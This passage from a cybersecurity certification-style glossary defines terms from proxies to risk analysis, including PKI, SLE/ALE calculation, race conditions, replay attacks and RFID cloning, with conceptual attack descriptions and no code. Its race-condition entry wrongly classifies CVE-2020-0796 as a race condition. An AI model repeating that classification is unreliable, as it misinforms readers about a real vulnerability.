1. A non-transparent proxy - Means the client must be configured with the proxy server address and port number to use it. By convention, the port on which the proxy server accepts client connections is often configured as port TCP/8080.

2. A transparent (or forced or intercepting) proxy - Intercepts client traffic without the client having to be reconfigured. A transparent proxy must be implemented as a router or as an inline network appliance.

Both types of proxy can be configured to require users to be authenticated before allowing access. The proxy is likely to be able to use single sign-on (SSO) to do this without having to prompt the user for a password.

A proxy auto-configuration (PAC) script allows a client to configure proxy settings without user intervention. The Web Proxy Auto-discovery (WPAD) protocol allows browsers to locate a PAC file.
Pseudo Random Number Generator (PRNG) - The process by which an algorithm produces numbers that approximate randomness without being truly random. A computer can use pseudo RNG (PRNG) software that is still deterministic, but able to approximate a high level of disorder.
Public (or Multi-tenant) Cloud - A cloud that is deployed for shared use by multiple independent tenants.

It is a service offered over the Internet by cloud service providers (rganization providing infrastructure, application, and/or storage services via an "as a service" subscription-based, cloud-centric offering) to cloud consumers. With this model, businesses can offer subscriptions or pay-as-you-go financing, while at the same time providing lower-tier services free of charge. As a shared resource, there are risks regarding performance and security. Multi-cloud (a cloud deployment model where the cloud consumer uses multiple public cloud services) architectures are where an organization uses services from multiple CSPs.
Public /  Unclassified Data - There are no restrictions on viewing the data. Public information presents no risk to an organization if it is disclosed but does present a risk if it is modified or not available. In some government contexts, the use of ‘unclassified’ may require authorization before release.
Public Key - During asymmetric encryption, the public key is freely distributed and used to encrypt data, which can only be decrypted by the linked private key in the pair.
Public Key Cryptography Standards (PKCS) - A series of standards defining the use of certificate authorities and digital certificates.
Public Key Infrastructure (PKI) - A framework of certificate authorities, digital certificates, software, services, and other cryptographic components deployed for the purpose of validating subject identities.

Public Key Infrastructure (PKI) is the framework that helps to establish trust in the use of public key cryptography to sign and encrypt messages via digital certificates. A digital certificate is a public assertion of identity, validated by a certificate authority (CA).

Public key infrastructure (PKI) aims to prove that the owners of public keys are who they say they are. Under PKI, anyone issuing a public key should publish it in a digital certificate. The certificate's validity is guaranteed by a certificate authority (CA).

PKI can use private or third party CAs. A private CA can be set up within an organization for internal communications. The certificates it issues will only be trusted within the organization. For public or business-to-business communications, a third-party CA can be used to establish a trust relationship between servers and clients. Examples of third-party CAs include Comodo, DigiCert, GeoTrust, IdenTrust, and Let's Encrypt.
Qualitative Risk Analysis - The process of determining the probability of occurrence and the impact of identified risks by using logical reasoning when numeric data is not readily available.

Qualitative risk analysis is a method used in risk management to assess risks based on subjective judgment and qualitative factors rather than precise numerical data. Qualitative risk analysis aims to provide a qualitative understanding of risks, their potential impact, and the likelihood of their occurrence. Often referred to as risk analysis using words, not numbers, this approach helps identify and prioritize intangible risks.

One of the benefits of qualitative risk analysis is its simplicity and ease of use. It does not require complex mathematical calculations or extensive data collection, making it a more accessible approach. It allows for a quick initial assessment of risks, enabling organizations to identify and focus on the most significant issues. Qualitative risk analysis frames risks by considering their causes, consequences, and potential interdependencies to improve risk communication and decision-making.

Qualitative risk analysis has some limitations. It is subjective in nature and heavily relies on expert judgment, which often introduces biases and inconsistencies if expert opinions differ. The lack of numerical data in qualitative risk analysis may make communicating risks to stakeholders who prefer quantitative information challenging. Despite these limitations, qualitative risk analysis is important because it provides a simplified description of risks and can help quickly draw attention to significant issues.
Quantitative Risk Analysis - A numerical method that is used to assess the probability and impact of risk and measure the impact.

Quantitative risk analysis aims to assign concrete values to each risk factor.

1. Single Loss Expectancy (SLE) - The amount that would be lost in a single occurrence of the risk factor. This is determined by multiplying the value of the asset by an exposure factor (EF). EF is the percentage of the asset value that would be lost . For example, it may be determined that a tornado weather event will damage 40% of a building . The exposure factor in this case is 40% because only part of the asset is lost. If the building is worth $200,000, this event SLE is 200,000*0.4 or $80,000.

2. Annualized Loss Expectancy (ALE) - The total cost of a risk to an organization on an annual basis. This is determined by multiplying the SLE by the annual rate of occurrence (ARO). The amount that would be lost over the course of a year. This is determined by multiplying the SLE by the annualized rate of occurrence (ARO - In risk calculation, an expression of the probability/likelihood of a risk as the number of times per year a particular loss is expected to occur). ARO describes the number of times in a year that an event occurs. In our previous (highly simplified) example, if it is anticipated that a tornado weather event will cause an impact twice per year, then the ARO is considered to be simply "2". The ALE is the cost of the event (SLE) multiplied by the number of times in a year it occurs. In the tornado example, SLE is $80,000 and ARO is 2 so the ALE is $160,000. This number is useful when considering different ways to protect the building from tornados. If it is known that tornados will have a $160,000 per year average cost, then this number can be used as a comparison when considering the cost of various protections.

It is important to realize that the value of an asset does not refer solely to its material value. The two principal additional considerations are direct costs associated with the asset being compromised (downtime) and consequent costs to intangible assets, such as the company's reputation. For example, a server may have a material cost of a few hundred dollars. If the server were stolen, the costs incurred from not being able to do business until it can be recovered or replaced could run to thousands of dollars. In addition, the period of interruption during which orders cannot be taken or go unfulfilled may lead customers to seek alternative suppliers, potentially resulting in the loss of thousands of sales and goodwill.

The value of quantitative analysis is its ability to develop tangible numbers that reflect real money. Quantitative analysis helps to justify the costs of various controls. When analysts can associate cost savings with a control, it is easy to justify its expense. For example, it is easy to justify the money spent on a load balancer to eliminate losses from website downtime that exceeded the cost of the load balancer. Unfortunately, such direct and clear associations are uncommon!

The problem with quantitative risk assessment is that the process of determining and assigning these values is complex and time-consuming. The accuracy of the values assigned is also difficult to determine without historical data (often, it has to be based on subjective guesswork). However, over time and with experience, this approach can yield a detailed and sophisticated description of assets and risks and provide a sound basis for justifying and prioritizing security expenditure.
Questionnaires (Vendor Management) - In vendor management, structured means of obtaining consistent information, enabling more effective risk analysis and comparison.

Questionnaires gather vendor information about their security practices, controls, and risk management strategies to help organizations assess a vendor's security posture, identify vulnerabilities, and evaluate their capabilities. Questionnaires provide a structured means of obtaining consistent vendor information, enabling more effective risk analysis and comparison fairly and consistently. Questionnaires collect information about the vendor's security policies, procedures, and controls, including data protection, access management, incident response, and disaster recovery. The questionnaire may ask about a vendor's compliance with industry-specific regulations and standards, such as GDPR, HIPAA, ISO 27001, or PCI-DSS. It may also seek details about the vendor's security training and awareness programs for employees and their approach to conducting third-party security assessments and audits. Additionally, the questionnaire may explore the vendor's incident response capabilities, breach history, and insurance coverage.

The answers to vendor risk management questionnaires should be validated by requesting supporting documentation, conducting site visits or audits, performing background checks, contacting references or previous clients, and utilizing third-party verification services to ensure the accuracy and reliability of the vendor's responses.
Race Condition and TOCTOU - Application race condition (A software vulnerability when the resulting outcome from execution processes is directly dependent on the order and timing of certain events, and those events fail to execute in the order and timing intended by the developer) vulnerabilities refer to software flaws associated with the timing or order of events within a software program, which can be manipulated, causing undesirable or unpredictable outcomes. A race condition describes when two or more operations must execute in the correct order. When software logic does not check or enforce the expected order of events, security issues such as data corruption, unauthorized access, or similar security breaches may occur. Race conditions manifest in a wide variety of ways, such as time-of-check to time-of-use (TOCTOU - The potential vulnerability that occurs when there is a change between when an app checked a resource and when the app used the resource) vulnerabilities, where a system state changes between the check (verification) stage and the use (execution) stage.

Imagine a scenario where a multi-threaded banking application used one program thread to check an account balance and another thread to withdraw money. If an attacker manipulates the sequence of execution in this example, they could potentially overdraw the account. These vulnerabilities underscore the importance of atomic operations where checking and execution are done as a single, indivisible operation, mitigating the likelihood of exploitation.

Two significant examples of race conditions include the Dirty COW Vulnerability (CVE-2016-5195), which is a race condition vulnerability in the Linux Kernel, allowing a local user to gain privileged access, and the Microsoft Windows Elevation of Privilege Vulnerability (CVE-2020-0796), which is a race condition vulnerability associated with the Microsoft Server Message Block 3.1.1 (SMBv3) protocol allowing an attacker to execute arbitrary code on a target SMB server or client. Race conditions are often mitigated by developers through the use of locks, semaphores, and monitors in multi -threaded applications.
Radio Frequency ID (RFID) - A means of encoding information into passive tags, which can be energized and read by radio waves from a reader device.
Ransomware - Malware that tries to extort money from the victim by blocking normal operation of a computer and/or encrypting the victim’s files and demanding payment.

Ransomware is a type of malware that tries to extort money from the victim by making the victim’s computer and/or data files unavailable and demanding payment. One class of ransomware will display threatening messages, such as requiring Windows to be reactivated or suggesting that the computer has been locked by the police because it was used to view child pornography or for terrorism. This may apparently block access to the file system by installing a different shell program.

Ransomware uses payment methods, such as wire transfer, cryptocurrency, or premium rate phone lines, to allow the attacker to extort money without revealing their identity or being traced by local law enforcement.
Reaction Time - The elapsed time between an incident occurring and a response being implemented.
Real-Time Operating Systems (RTOS) - A type of OS that prioritizes deterministic execution of operations to ensure consistent response for time-critical tasks.

A Real-Time Operating Systems (RTOS) is a type of operating system designed for use in applications that require real-time processing and response. They are purpose-specific operating systems designed for high levels of stability and processing speed.

Examples of RTOS
The VxWorks operating system is commonly used in aerospace and defense systems. VxWorks provides real-time performance and reliability and is therefore well suited for use in aircraft control systems, missile guidance systems, and other critical defense systems. Another example of an RTOS is FreeRTOS, an open-source operating system used in many embedded systems, such as robotics, industrial automation, and consumer electronics.

In the automotive industry, RTOS is used in engine control, transmission control, and active safety systems applications. For example, the AUTOSAR (Automotive Open System Architecture) standard defines a framework for developing automotive software, including using RTOS for certain applications. In medical devices, RTOS is used for applications such as patient monitoring systems, medical imaging, and automated drug delivery systems.

In industrial control systems, RTOS is used for process control and factory automation applications. For example, the Siemens SIMATIC WinCC Open Architecture system uses an RTOS to provide real-time performance and reliability for industrial automation applications.

Risks Associated with RTOS
A security breach involving RTOS can have serious consequences. RTOS software can be complex and difficult to secure, which makes it challenging to identify and address vulnerabilities that could be exploited by attackers.

Another security risk associated with RTOS is the potential for system-level attacks. An attacker who gains access to an RTOS-based system could potentially disrupt critical processes or gain control over the system it is designed to control. This can lead to serious consequences considering the types of applications that rely on RTOS, such as medical devices and industrial control systems. A security breach could result in harm to people or damage to equipment.
Recognizing Risky Behaviors - Risky behaviors are actions or practices that threaten data security, systems, or networks. These behaviors may involve unsafe online activities, such as clicking on suspicious links, visiting untrusted websites, or downloading unauthorized software. Risky behaviors can also include neglecting security measures, such as using weak passwords, sharing credentials, or ignoring software updates. Unexpected behaviors are actions that deviate from established security protocols or violate security policies. These behaviors can occur due to a lack of awareness, carelessness, or a failure to follow established procedures. Examples include unauthorized access to sensitive information, bypassing security controls, or disregarding physical security measures. Unintentional behaviors refer to actions without malicious intent but can still have detrimental consequences. These behaviors often stem from human error, lack of training, or lack of understanding of security best practices. Examples include accidental data breaches, mishandling of confidential information, or falling victim to social engineering attacks.

All three types of behaviors (risky, unexpected, and unintentional) can lead to security incidents, data breaches, or the compromise of sensitive information. Individuals must be aware of these behaviors, follow security guidelines, stay informed about emerging threats, and practice good cybersecurity hygiene. Organizations are responsible for training and educating employees about these behaviors to promote a security-conscious culture and minimize the impact of human-related vulnerabilities in the cybersecurity landscape.
Reconnaissance - The actions taken to gather information about an individual or organization's computer systems and software. This typically involves collecting information such as the types of systems and software used, user account information, data types, and network configuration.

Reconnaissance is where a threat actor uses scanning tools to learn about the network. Host discovery identifies which IP addresses are in use. Service discovery identifies which TCP or UDP ports are open on a given host. Fingerprinting identifies the application types and versions of the software operating each port, and potentially of the operating system running on the host, and its device type. Rapid scanning generates a large amount of distinctive network traffic that can be detected and reported as an intrusion event, but it is very difficult to differentiate malicious scanning activity from non-malicious scanning activity.
Recovery Point Objective (RPO) - The longest period that an organization can tolerate lost data being unrecoverable.

Recovery point objective (RPO) is the amount of data loss that a system can sustain, measured in time. That is, if a database is destroyed by a virus, an RPO of 24 hours means that the data can be recovered (from a backup copy) to a point not more than 24 hours before the database was infected. RPO is determined by identifying the maximum acceptable data loss an organization can tolerate in the event of a disaster or system failure and is established by considering factors such as business requirements, data criticality, and regulatory or contractual obligations. The calculation of RPO directly impacts the frequency of data backups, data replication requirements, recovery site selection, and technologies that support failover and high availability.
Recovery Time Objective (RTO) - The maximum time allowed to restore a system after a failure event.

Recovery time objective (RTO) is the period following a disaster that an individual IT system may remain offline. This represents the amount of time it takes to identify that there is a problem and then perform recovery (restore from backup or switch to an alternative system, for instance).
Redundancy - Overprovisioning resources at the component, host, and/or site level so that there is failover to a working instance in the event of a problem.
Regulated Data - Information that has storage and handling compliance requirements defined by national and state legislation and/or industry regulations.

Regulated data refers to specific categories of information subject to legal or regulatory requirements regarding their handling, storage, and protection. Regulated data typically includes sensitive or personally identifiable information (PII) protected by laws and regulations to ensure privacy, security, and appropriate use. The types of regulated data vary depending on jurisdiction and the specific regulations applicable to the organization or data. Common examples of regulated data include financial information, healthcare records, social security numbers, credit card details, and other personally identifiable information. Privacy laws and industry-specific regulations often protect these data types, such as the Health Insurance Portability and Accountability Act (HIPAA) for healthcare data or the Payment Card Industry Data Security Standard (PCI DSS) for credit card information. Organizations that handle regulated data must comply with relevant laws and regulations governing its protection. Compliance typically involves implementing appropriate security measures, data encryption, access controls, data breach notification procedures, and data handling protocols. Organizations may also need to establish data storage, retention, and destruction safeguards to meet regulatory requirements.
Remote Access - Infrastructure, protocols, and software that allow a host to join a local network from a physically remote location, or that allow a session on a host to be established over a network.

Remote access networking means that the user's device does not make a direct cabled or wireless connection to the network. The connection occurs over or through an intermediate network.

Historically, remote access used analog modems connecting over the telephone system. These days, most remote access is implemented as a virtual private network (VPN), running over Internet Service Provider (ISP) networks.

With a remote access VPN, clients connect to a VPN gateway on the edge of the private network. This client-to-site VPN topology is the "telecommuter" model, allowing homeworkers and employees working in the field to connect to the corporate network. The VPN protocol establishes a secure tunnel to keep the contents private, even when the packets pass over ISPs' routers.

A VPN can also be deployed in a site-to-site model to connect two or more private networks. Whereas remote access VPN connections are typically initiated by the client, a site-to-site VPN is configured to operate automatically. The gateways exchange security information using whichever protocol the VPN is based on. This establishes a trust relationship between the gateways and sets up a secure connection through which to tunnel data. Hosts at each site do not need to be configured with any information about the VPN. The routing infrastructure at each site determines whether to deliver traffic locally or send it over the VPN tunnel.
Remote Access Trojan (RAT) - Malware that creates a backdoor remote administration channel to allow a threat actor to access and control the infected host.

A remote access Trojan (RAT) is backdoor malware that mimics the functionality of legitimate remote control programs, but is designed specifically to operate covertly. Once the RAT is installed, it allows the threat actor to access the host, upload files, and install software or use "live off the land" techniques to effect further compromises.

In this context, RAT can also stand for remote administration tool. A host that is under malicious control is sometimes described as a zombie.
Remote and Wireless Network (Network Vector) - The attacker either obtains credentials for a remote access or wireless connection to the network or cracks the security protocols used for authentication. Alternatively, the attacker spoofs a trusted resource, such as an access point, and uses it to perform credential harvesting and then uses the stolen account details to access the network.
Remote Authentication Dial-In User Service (RADIUS) - The Remote Authentication Dial-In User Service (RADIUS) standard is published as an Internet standard. There are several RADIUS server and client products.

The NAS device (Network Access Server) is configured with the IP address of the RADIUS server and with a shared secret. This allows the client to authenticate to the server. Remember that the client is the access device (switch, access point, or VPN gateway), not the user's PC or laptop. A generic RADIUS authentication workflow proceeds as follows:

1. The user's device (the supplicant) makes a connection to the NAS appliance, such as an access point, switch, or remote access server.

2. The NAS prompts the user for their authentication credentials. RADIUS supports PAP, CHAP, and EAP. Most implementations now use EAP, as PAP and CHAP are not secure. If EAP credentials are required, the NAS enables the supplicant to transmit EAP over LAN (EAPoL - A port-based network access control (PNAC) mechanism that allows the use of EAP authentication when a host connects to an Ethernet switch) data, but not any other type of network traffic.

3. The supplicant submits the credentials as EAPoL data. The RADIUS client uses this information to create an Access-Request RADIUS packet, encrypted using the shared secret. It sends the Access-Request to the Authentication, Authorization, and 

4. Accounting (AAA) server using UDP on port 1812 (by default).
The AAA server decrypts the Access-Request using the shared secret. If the Access-Request cannot be decrypted (because the shared secret is not correctly configured, for instance), the server does not respond.

5. With EAP, there will be an exchange of Access-Challenge and Access-Request packets as the authentication method is set up and the credentials verified. The NAS acts as a pass-thru, taking RADIUS messages from the server, and encapsulating them as EAPoL to transmit to the supplicant.

6. At the end of this exchange, if the supplicant is authenticated, the AAA server responds with an Access-Accept packet; otherwise, an Access-Reject packet is returned.

Optionally, the NAS can use RADIUS for accounting (logging). Accounting uses port 1813. The accounting server can be different from the authentication server.
Remote Code Execution - A vulnerability that allows an attacker to transmit code from a remote host for execution on a target host or a module that exploits such a vulnerability. Where the code is transmitted from one machine to another, it can be referred to as remote code execution.
Remote Desktop Protocol (RDP) - Application protocol for operating remote connections to a host using a graphical interface. The protocol sends screen data from the remote host to the client and transfers mouse and keyboard input from the client to the remote host. It uses TCP port 3389.
Remote Network Vector - Remote means that the vulnerability can be exploited by sending code to the target over a network and does not depend on an authenticated session with the system to execute.
Removable Device (Lure-Based Vector) - The attacker conceals malware on a USB thumb drive or memory card and tries to trick employees into connecting the media to a PC, laptop, or smartphone. For some exploits, simply connecting the media may be sufficient to run the malware. More typically, the attacker may need the employee to open a file in a vulnerable application or run a setup program. In a drop attack, the threat actor simply leaves infected USB sticks in office grounds, reception areas, or parking lots in the expectation that at least one employee will pick one up and plug it into a computer.
Replay Attack - An attack where the attacker intercepts some authentication data and reuses it to try to reestablish a session.

In the context of a web application, a replay attack most often means exploiting cookie-based sessions. HTTP is nominally a stateless protocol, meaning that the server preserves no information about the client. To overcome this limitation, mechanisms such as cookies have been developed to preserve stateful data. A cookie is created when the server sends an HTTP response header with the cookie data. A cookie has a name and value, plus optional security and expiry attributes. Subsequent request headers sent by the client will usually include the cookie. Cookies are either nonpersistent cookies, in which case they are stored in memory and deleted when the browser instance is closed, or persistent, in which case they are stored in the browser cache until deleted by the user or pass a defined expiration date.

Session management enables a web application to uniquely identify a user across a number of different actions and requests. A session token identifies the user and may also be used to prove that the user has been authenticated. A replay attack works by capturing or guessing the token value, and then submitting it to reestablish the session illegitimately.

Attackers can capture cookies by sniffing network traffic via an on-path attack or when they are sent over an unsecured network, like a public Wi-Fi hotspot. Malware infecting a host is also likely to be able to capture cookies. Session cookies can also be compromised via cross-site scripting (XSS).

Cross-site scripting (XSS) is an attack technique that runs malicious code in a browser in the context of a trusted site or application.

Session prediction attacks focus on identifying possible weaknesses in the generation of tokens that will enable an attacker to anticipate values that will establish sessions in the future. A session token must be generated using a non-predictable algorithm, and it must not reveal any information about the session client. In addition, proper session management dictates that apps limit the life span of a session and require reauthentication after a certain period.
Replication - Replication is a protection method that ensure data availability and integrity by maintaining multiple copies and tracking changes to data.

Replication involves creating and maintaining exact copies of data on different storage systems or locations. Organizations can safeguard against data loss due to hardware failures, human errors, or malicious attacks by having redundant copies of the data. In the event of a failure, the replicated data can be utilized to restore the system to its original state.

A practical example of replication is database mirroring, where an organization maintains primary and secondary mirrored databases. Any changes made to the primary database are automatically replicated to the secondary database, ensuring data consistency and availability if the primary database encounters any issues.

1. SAN Replication - Duplicates data from one SAN to another in real time or near real time, providing redundancy and protection against hardware failures, human errors, or data corruption. This technique involves synchronous replication, which guarantees data consistency, and asynchronous replication, which is more cost-effective but slightly less stringent in consistency.

2. VM Replication - Creates and maintains an up-to-date copy of a virtual machine on a separate host or location, ensuring that a secondary VM can quickly take over the workload in the event of a primary VM failure or corruption. By implementing these methods, organizations can bolster their data protection strategies, safeguarding against various risks and ensuring the availability and integrity of their critical data and systems.
Reporting - A forensics process that summarizes significant contents of digital data using open, repeatable, and unbiased methods and tools.
Representational State Transfer (REST) - A standardized, stateless architectural style used by web applications for communication and integration.
Reputational Threat Intelligence - Blacklists of known threat sources, such as malware signatures, IP address ranges, and DNS domains.
Residual Risk - Risk that remains even after controls are put into place.

Residual risk is the likelihood and impact after specific mitigation, transference, or acceptance measures have been applied.
Resilient Cloud Architecture - One of the benefits of the cloud is the potential to provide services resilient to failures at different levels, such as components, servers, local networks, sites, datacenters, and wide area networks. The CSP uses a virtualization layer to ensure that computer, storage, and network provisions meet the availability criteria set out in its SLA.

In terms of storage performance tiers, high availability (HA) refers to storage provisioned with a guarantee of 99.99% uptime or better. As with on-premises architecture, the CSP uses redundancy to make multiple disk controllers and storage devices available to a pool of storage resources. Data may be replicated between pools or groups, with each pool supported by separate hardware resources.

Replication
Data replication allows businesses to copy data to where it can be utilized most effectively. The cloud may be used as a central storage area, making data available among all business units. Data replication requires low latency network connections, security, and data integrity. CSPs offer several data storage performance tiers. The terms "hot storage" and "cold storage" refer to how quickly data is retrieved. Hot storage retrieves data more quickly than cold, but the quicker the data retrieval, the higher the cost.

Different applications have diverse replication requirements. A database generally needs low-latency, synchronous replication, as a transaction often cannot be considered complete until it has been made on all replicas. A mechanism to replicate data files to backup storage might not have such high requirements, depending on the criticality of the data.

High Availability Across Zones
CSPs divide the world into regions. Each region is independent of the others. The regions are divided into availability zones. The availability zones have independent datacenters with their own power, cooling, and network connectivity. You can choose to host data, services, and VM instances in a particular region to provide a lower latency service to customers. Provisioning resources in multiple zones and regions can also improve performance and increases redundancy, but it requires an adequate level of replication performance.

Consequently, CSPs offer several tiers of replication representing different high availability service levels:

1. Local Replication - Replicates your data within a single datacenter in the region where you created your storage account. The replicas are often in separate fault domains and upgrade domains.

2. Regional Replication (also called zone-redundant storage) - Replicates your data across multiple datacenters within one or two regions. This safeguards data and access in the event a single datacenter is destroyed or goes offline.

3. Geo-redundant Storage (GRS) - Replicates your data to a secondary region that is distant from the primary region. This safeguards data in the event of a regional outage or a disaster.
Resource Consumption - A potential indicator of malicious activity where CPU, memory, storage, and/or network usage deviates from expected norms.
Resource Inaccessibility - A potential indicator of malicious activity where a file or service resource that should be available is inaccessible.

Resource inaccessibility means that a network, host, file, or database is not available. This is typically an indicator of a denial of service (DoS) attack. Host and network gateways might be unavailable due to excessive resource consumption. A network attack will often create large numbers of connections. Data resources might be subject to ransomware attack. Additionally, malware might disable scanning and monitoring utilities to evade detection.
Resources / Funding - The ability of threat actors to draw upon funding to acquire personnel, tools, and to develop novel attack types. A high level of capability must be supported by resources/funding. Sophisticated threat actor groups need to be able to acquire resources, such as customized attack tools and skilled strategists, designers, coders, hackers, and social engineers. The most capable threat actor groups receive funding from nation-states and organized crime.
Responsible Disclosure Programs - A process that allows researchers and reviewers to safely disclose vulnerabilities to a software developer.

Responsible disclosure programs are established by organizations to encourage individuals to report security vulnerabilities in software or systems, allowing the organization to address and fix these vulnerabilities before they can be exploited maliciously. Responsible disclosure programs provide guidelines and procedures for reporting vulnerabilities and often offer rewards or recognition to individuals who responsibly disclose verified security issues.
Restarts, Dependencies, and Downtime - Service and application restarts, as well as downtime, are critical considerations because they typically have a direct impact on business operations. For example, reconfigurations and patching changes often require restarting services or applications, leading to downtime. One of the primary goals of change management is to minimize these disruptions by scheduling restarts or downtime events during maintenance windows or off-peak times to reduce the impact on users and business processes.

Change management processes include communication requirements designed to ensure relevant stakeholders are aware of service outages so they can prepare accordingly. Effective change communication enhances the visibility of the change management process among stakeholders and fosters a culture of transparency and cooperation.

Services and applications often depend on other software, interfaces, and services to function correctly. These dependencies (Resources and other services that must be available and running for a service to start) complicate changes because a service restart in one area may significantly impact another. For example, if a database server is restarted, all applications that rely (depend) on the database will likely experience issues or downtime. A change that initially appeared to be minor may impact a wide range of the organization's operations. A careful analysis of software and system dependencies is critical for reasons like these. Understanding what services depend on each other, how restarts impact them, and what measures need to be taken to mitigate potential impacts help avoid unintended outages.

Dependencies also impact the time needed for a change. If a service restart requires other services to be shut down or restarted, the overall change process will need more time. Additionally, backout plans may also need to consider dependencies as part of the process, which will also require additional time.

Understanding the risks associated with restarts and downtime drives the development of effective backout plans and downtime contingencies, ensuring the organization is well prepared to handle any potential complications and unintended consequences related to the change. Additionally, understanding risks associated with a change also supports the development of post-change performance monitoring to validate that systems function as required and help detect issues quickly. Sometimes, the potential risks of a change causing significant disruption require the organization to identify alternative solutions.

Some typical IT changes that generally require service or application restarts and result in downtime are as follows:

1. Software Upgrades and Patches - When upgrading software applications, especially major version updates or patches, a restart of the application is typically needed to apply the changes effectively and ensure the updated version is fully functional.

2. Configuration Changes - Many system configuration changes, such as modifying server settings, network configurations, or database parameters, require a restart of the affected services to apply the changed configurations properly.

3. Infrastructure Changes - When changing infrastructure components, such as switches, routers, firewalls, and load balancers, it is typically necessary to restart the devices to apply the changes and ensure they do not negatively impact operations.

4. Security Changes - Implementing specific security measures, such as updating encryption protocols, enabling or disabling security features, or modifying access control settings, may require a restart of the services or applications to enforce the new security configurations effectively.

Downtime refers to the scheduled time designated for changes to be implemented (scheduled downtime) or the amount of time a service or application is unavailable (unscheduled downtime).

Legacy Systems and Applications
Legacy applications pose unique challenges regarding change management as these systems are often critical to business operations and are difficult to manage. Many legacy applications are built using outdated technology, which introduces compatibility issues when implementing changes. For example, new software or security updates may be incompatible with legacy systems. These incompatibility issues might require specialized solutions, such as virtualization, emulation, interpreters, custom "fit-gap" software, or modifications to the newer components to ensure compatibility. These accommodations further complicate the manageability of the legacy application.

Legacy applications often lack comprehensive documentation or have been heavily customized over years or even decades, making them extremely difficult to manage. This complexity necessitates extensive testing and meticulous implementation plans to help avoid unintended consequences or outages. Legacy applications also typically lack vendor support, removing the option to "call for help," which increases the risks associated with any change. A lack of vendor support coupled with high complexity, poor documentation, and business criticality make legacy systems a significant security problem.
Restricted Data - This classification refers to sensitive information that requires stringent controls and limited access due to its highly confidential nature. Restricted data typically includes data that, if disclosed or accessed by unauthorized individuals, could cause significant harm to individuals, organizations, or national security.
Reverse Proxy Server - A type of proxy server that protects servers from direct contact with client requests. A reverse proxy server provides for protocol-specific inbound traffic. A reverse proxy is typically deployed on the network edge and configured to listen for client requests from a public network (the Internet). The proxy applies filtering rules and if accepted, it creates the appropriate request and forwards it to an application server within a specially secured screened subnet zone on the local network.
RFID Cloning - Radio Frequency ID (RFID - A means of encoding information into passive tags, which can be energized and read by radio waves from a reader device) is a means of encoding information into passive tags. When a reader is within range of the tag, it produces an electromagnetic wave that powers up the tag and allows the reader to collect information from it. This technology can be used to implement contactless building access control systems.

RFID cloning and skimming refer to ways of counterfeiting contactless building access cards or badges:

1. Card Cloning (Making a copy of a contactless access card) - This refers to making one or more copies of an existing card. A lost or stolen card with no cryptographic protections can be physically duplicated. Card loss should be reported immediately so that it can be revoked and a new one issued. If there was a successful attack, it might be indicated by use of a card in a suspicious location or time of day.

2. Skimming (Making a duplicate of a contactless access card by copying its access token and programming a new card with the same data) - This refers to using a counterfeit reader to capture card or badge details, which are then used to program a duplicate. Some types of proximity cards can quite easily be made to transmit the credential to a portable RFID reader that a threat actor could conceal on their person.

These attacks can generally only target "dumb" access cards that transfer static tokens rather than perform cryptoprocessing. If use of the cards is logged, compromise might be indicated by impossible travel and concurrent use access patterns.

Near-field communication (NFC) is derived from RFID and is also often used for contactless cards. It works only at very close range and allows two-way communications between NFC peers.
Right-to-Audit Clause (Vendor Assessment Method) - A right-to-audit clause is a contractual provision that grants an organization the authority to conduct audits or assessments of vendor operational practices, information systems, and security controls. The right-to-audit clause supports vendor assessment practices by allowing organizations to validate and verify the vendor's compliance with contractual obligations, security standards, and regulatory requirements. By exercising the right to audit, organizations can gain transparency into the vendor's operations, identify gaps or deficiencies, and ensure that the vendor maintains the expected level of security and compliance at all times.
Risk - Likelihood and impact (or consequence) of a threat actor exercising a vulnerability. Risk is the level of hazard posed by vulnerabilities and threats. When a vulnerability is identified, risk is calculated as the likelihood of it being exploited by a threat actor and the impact that a successful exploit would have.
Risk Acceptance / Risk Tolerance - The response of determining that a risk is within the organization's appetite and no countermeasures other than ongoing monitoring is needed.

It means that no countermeasures are put in place because the level of risk does not justify it.
Risk Analysis - Process for qualifying or quantifying the likelihood and impact of a factor.

Risk analysis describes the process of identifying and evaluating potential risks and the characteristics that define them. Risk analysis aims to understand the nature and scope of risks by examining their causes, consequences, and concerns.

Quantitative Analysis
A numerical method that is used to assess the probability and impact of risk and measure the impact.

Quantitative risk analysis aims to assign concrete values to each risk factor.

1. Single Loss Expectancy (SLE) - The amount that would be lost in a single occurrence of a particular risk factor. The amount that would be lost in a single occurrence of the risk factor. This is determined by multiplying the value of the asset by an exposure factor (EF). EF is the percentage of the asset value that would be lost . For example, it may be determined that a tornado weather event will damage 40% of a building . The exposure factor in this case is 40% because only part of the asset is lost. If the building is worth $200,000, this event SLE is 200,000*0.4 or $80,000.

2. Annualized Loss Expectancy (ALE) - The total cost of a risk to an organization on an annual basis. This is determined by multiplying the SLE by the annual rate of occurrence (ARO). The amount that would be lost over the course of a year. This is determined by multiplying the SLE by the annualized rate of occurrence (ARO - In risk calculation, an expression of the probability/likelihood of a risk as the number of times per year a particular loss is expected to occur). ARO describes the number of times in a year that an event occurs. In our previous (highly simplified) example, if it is anticipated that a tornado weather event will cause an impact twice per year, then the ARO is considered to be simply "2". The ALE is the cost of the event (SLE) multiplied by the number of times in a year it occurs. In the tornado example, SLE is $80,000 and ARO is 2 so the ALE is $160,000. This number is useful when considering different ways to protect the building from tornados. If it is known that tornados will have a $160,000 per year average cost, then this number can be used as a comparison when considering the cost of various protections.

It is important to realize that the value of an asset does not refer solely to its material value. The two principal additional considerations are direct costs associated with the asset being compromised (downtime) and consequent costs to intangible assets, such as the company's reputation. For example, a server may have a material cost of a few hundred dollars. If the server were stolen, the costs incurred from not being able to do business until it can be recovered or replaced could run to thousands of dollars. In addition, the period of interruption during which orders cannot be taken or go unfulfilled may lead customers to seek alternative suppliers, potentially resulting in the loss of thousands of sales and goodwill.

The value of quantitative analysis is its ability to develop tangible numbers that reflect real money. Quantitative analysis helps to justify the costs of various controls. When analysts can associate cost savings with a control, it is easy to justify its expense. For example, it is easy to justify the money spent on a load balancer to eliminate losses from website downtime that exceeded the cost of the load balancer. Unfortunately, such direct and clear associations are uncommon!

The problem with quantitative risk assessment is that the process of determining and assigning these values is complex and time-consuming. The accuracy of the values assigned is also difficult to determine without historical data (often, it has to be based on subjective guesswork). However, over time and with experience, this approach can yield a detailed and sophisticated description of assets and risks and provide a sound basis for justifying and prioritizing security expenditure.

Qualitative Analysis
The process of determining the probability of occurrence and the impact of identified risks by using logical reasoning when numeric data is not readily available.

Qualitative risk analysis is a method used in risk management to assess risks based on subjective judgment and qualitative factors rather than precise numerical data. Qualitative risk analysis aims to provide a qualitative understanding of risks, their potential impact, and the likelihood of their occurrence. Often referred to as risk analysis using words, not numbers, this approach helps identify and prioritize intangible risks.

